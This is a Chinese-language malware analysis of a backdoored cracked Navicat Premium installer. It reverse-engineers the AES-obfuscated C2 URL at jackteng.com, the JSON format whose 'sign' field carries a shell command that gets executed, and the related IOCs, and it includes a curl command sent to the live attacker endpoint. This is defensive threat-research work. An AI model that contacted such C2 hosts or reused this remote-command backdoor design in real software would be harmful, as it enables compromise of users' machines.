今天微步发了篇通报说某第三方下载站的破解版 Navicat Premium 遭到 APT 组织的投毒， 看了一眼微步的报告， 只给了两条 IOC， 一个 IP(120.77.35.111)

和一个域名(www.jackteng.com)， 没有给到样本的 hash。然后我就去下载站下了最近两个版本的安装包，也没有发现样本。最终在 VirusTotal 上面抓到了样本：https://www.virustotal.com/gui/file/bd9b3f4d98e92d57c89b20120a0cb2482d2c28d32473aed64a3c97baff910978

看时间就是这两天捕获的样本

闲着没事就随便逆了一下，这个样本逻辑很简单，就是用 HTTP GET 请求一条 SHELL 命令然后执行。分析如下：

Reverse

拖进 Ghidra 之后一眼看到了一个 load 函数，内容是调用 hookCommon.

hookCommon 里主要是调用了一个 0x5290 这个 block， 0x5290 里面调用了 request

request 就是请求的主要逻辑，里面把 url 信息做了一个 AES 加密：

跟到 AESDecrypt（0x3220） 里面就能看到密钥

直接丢进去 CyberChef 解密，结果为：

"oPp2nG8br7oIB+5wLoA6Bg==": "https://"

"7aNbT/MmPQZvR47zVMYzfQ==": "www"

"fohdSF8IH2nWPwip5U337bID7bkLXA9ISXdSwtoNaF96HF/CalQVcUrJ/kjsalCU": "jackteng.com/aCbnd4bZaXXkQNVB/v.php"

跟微步报告里的信息一致，说明应该是同一个样本。

后面的代码是设置了一个 "Content-Type: application/json" 的 HTTP Header， 然后拼接 Url + "?ver=1.5&id=电脑序列号"：

发送请求， 其中有两个 Block， 一个 0x3f50 是请求成功的回调， 一个 0x4720 是请求失败的回调

直接看请求成功的回调， 正确的参数签名应该是 (sel, NSURLSessionDataTask *task, id responseObject)， 所以第三个参数是 response

回调里面的几个逻辑， 判断响应数据的长度， length < 0xa 则丢弃并且调用 request 重试

否则的话使用 AESDecrypt 进行解密，解出来应该是一段 JSON，结构如下：

{
  "time:": int,
  "enable": bool,
  "sign": str, // shell command
}

如果 enable 的话则调用 runShellWithCommand 执行 shell (JSON 里的 sign 字符串)

x

通过以下命令测试，这个接口现在已经不返回数据了：

curl 'https://www.jackteng.com/aCbnd4bZaXXkQNVB/v.php?ver=1.5&id=x' -H "Content-Type: application/json"

报告里的 d.py 目前也无法访问，所以无法继续验证报告后续的内容。不过这个恶意样本确实是个实锤，但因为微步还没有给出源头报告，所以目前也无法确定是乌龙还是 Winnti 紧急把投毒版本下线了（个人感觉后者可能性比较高）。源头暂时无法确定，建议用破解版的先卸载。
